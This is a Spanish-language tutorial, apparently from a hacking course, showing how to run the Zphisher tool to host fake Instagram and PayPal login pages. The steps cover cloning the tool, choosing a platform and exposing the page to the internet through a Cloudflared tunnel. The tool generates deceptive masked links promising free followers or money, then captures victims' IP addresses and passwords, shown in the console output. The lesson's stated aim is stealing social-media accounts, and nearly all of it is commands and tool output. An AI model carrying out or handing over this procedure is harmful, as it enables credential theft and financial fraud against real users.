# 40. Phishing con Zphisher

Vamos a ver un ataque Phishing para poder robar cuentas de redes sociales.

Consiste en que el atacante crea una página falsa, comúnmente de una red social, pero también pueden ser páginas de un banco, cualquier aplicación
que requira ingresar con un usuario y una contraseña.

Este ataque sirve para capturar datos como contraseñas, usuarios, etc. Pero está página falsa creada por el atacante, la víctima ingresa los
datos y se le mandan al atacante.

## Zphisher

Vamos a utilizar la herramienta **Zphisher**.

* Repositorio de GitHub: [Zphisher](https://github.com/htr-tech/zphisher)

La instalamos (clonamos) con:

```bash
git clone https://github.com/htr-tech/zphisher.git
```

Una vez descargada, hacemos un:

```bash
ls
```

Tenemos una herramienta (directorio) que se llama `zphisher`. Nos vamos a la carpeta:

```bash
cd zphisher
ls
```

Y tenemos estos archivos:
**Dockerfile**, **LICENSE**, **make-deb.sh**, **README.md** , **run-docker.sh**, **scripts** (directorio), **zphisher.py**

## Uso

Vamos a ejecutar el archivo:

```bash
bash zphisher.sh
```

Se va a iniciar la herramienta, instalando las dependencias que necesita para esta aplicación para funcionar.

### Instagram

Una vez termine, vamos a elegir sobre qué plataforma queremos hacer un ataque. Vamos a probarlo en Instagram `2`:

```plaintext
[-] Select an option : 2
```

Vamos elegir la página tradicional de inicio de sesión `1`:

```plaintext
[01] Traditional Login Page
[02] Auto Followers Login Page
[03] 1000 Followers Login Page
[04] Blue Badge Verify Login Page

[-] Select an option : 1
```

Y vamos a elegir el servicio de **port forwarding** que vamos a utilizar para que la página sea visible a todo el mundo.

Lo que vamos a hacer, es que en nuestro servidor local, en nuestro sistema Kali Linux, vamos a armar un servidor local en el cual va a estar
hospedado está página web falsa.

Con los servicios mostrados, vamos a hacer que este servidor web local sea visible a todo el mundo, para que cualquier computadora pueda acceder
a la página web falsa a través de estos servicios.

Vamos a elegir la opción `2`:

```plaintext
[01] Localhost
[02] Cloudflared    [Auto Detects]
[03] LocalXpose     [NEW! Max 15Min]

[-] Select a port forwarding service : 2
```

En está opción, ponemos que *no*:

```plaintext
[?] Do You Want A Custom Port [y/N]: n
```

Se va a estar inicializando la página web falsa. A esta opción, ponemos que *no*:

```plaintext
[?] Do you want to change Mask URL [y/N] : n
```

Y tendremos 3 links:

```plaintext
[-] URL 1 : https://shot-suggested-favourite-split.tryclodflare.com

[-] URL 2: https://is.gd/p3PnPX

[-] URL 3 : https://get-unlimited-followers-for-instagram@is.gd/p3PnPX

[-] Waiting for Login Info, Ctrl + C to exit ...
```

Copiamos el primer link e ingresamos a la página web falsa. En el panel, veremos la dirección IP de la máquina víctima:

```plaintext
[-] Victim IP Found !

[-] Victim's IP : <victim-ip>

[-] Saved in : auth/ip.txt
```

Y tenemos una página de inicio de sesión de Instagram. Haciendo el papel de víctima, ingresamos nuestro usuario y contraseña: **usuario1234** y
**contraseña1234**, y le damos en **Log In**.
Una vez ingresamos los datos, nos redirige de vuelta a la página verdadera de Instagram.

Y si volvemos a la consola donde lanzamos el programa de phishing, nos dió la información de inicio de sesión:

```plaintext
[-] Login info Found !

[-] Account : usuario1234

[-] Password : contraseña1234

[-] Saved in : auth/usernames.dat

[-] Waiting for Login Info, Ctrl + C to exit.
```

Tenemos el usuario y contraseña de la víctima que capturamos mediante la página falsa. Podemos hacerlo con cualquier plataforma.

### PayPal

Le damos a **Ctrl + C** para salir de la aplicación, y lanzamos la aplicación otra vez:

```bash
bash zphisher.sh
```

Ahora vamos a probar utilizando PayPal, elegimos la opción `6`:

```plaintext
[-] Select an option : 6
```

Elegimos acá la opción `2`:

```plaintext
[01] Localhost
[02] Cloudflared    [Auto Detects]
[03] LocalXpose     [NEW! Max 15Min]

[-] Select a port forwarding service : 2
```

En estas opciones, ponemos que *no*:

```plaintext
[?] Do You Want A Custom Port [y/N]: n

[?] Do you want to change Mask URL [y/N] : n
```

Y tendremos 3 links:

```plaintext
[-] URL 1 : https://soul-bonds-interested-partition.tryclodflare.com

[-] URL 2: https://is.gd/1NFH2B

[-] URL 3 : https://get-500-usd-free-to-your-account@is.gd/1NFH2B

[-] Waiting for Login Info, Ctrl + C to exit ...
```

Copiamos el primer link y lo pegamos en el navegador. Tendremos una página de inicio de sesión de PayPal.

Simulando que somos una víctima, ingresamos nuestro email y contraseña: **usuario1234@gmail.com** y **contraseña12345678**. Le damos **Log In**.

Si volvemos a la aplicación:

```plaintext
[-] Victim IP Found !

[-] Victim's IP : <victim-ip>

[-] Saved in : auth/ip.txt

[-] Login info Found !

[-] Account : usuario1234@gmail.com

[-] Password : contraseña12345678

[-] Saved in : auth/usernames.dat

[-] Waiting for Login Info, Ctrl + C to exit.
```

Se capturaron los datos de inicio de sesión del usuario, de la cuenta de PayPal de la víctima.